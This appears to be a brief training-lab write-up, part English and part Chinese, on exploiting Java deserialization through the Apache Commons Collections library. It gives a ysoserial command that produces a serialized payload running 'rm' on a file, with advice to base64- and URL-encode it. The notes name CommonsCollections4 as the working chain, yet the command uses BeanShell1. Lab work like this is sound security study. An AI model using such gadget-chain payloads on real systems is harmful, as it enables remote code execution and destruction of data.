# Lab: Exploiting Java deserialization with Apache Commons

 This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

## Insecure Deserialization
* 可以用工具 ysoserial，因為是黑箱，並不知道他到底用的是什麼樣的 class，指能依照工具給的一個一個試，試到 `CommonsCollections4` 就會過了
```
java -jar ysoserial-master-8eb5cbfbf6-1.jar BeanShell1 'rm /home/carlos/morale.txt' | base64
```
* 記得最後的 payload 要用 urlencode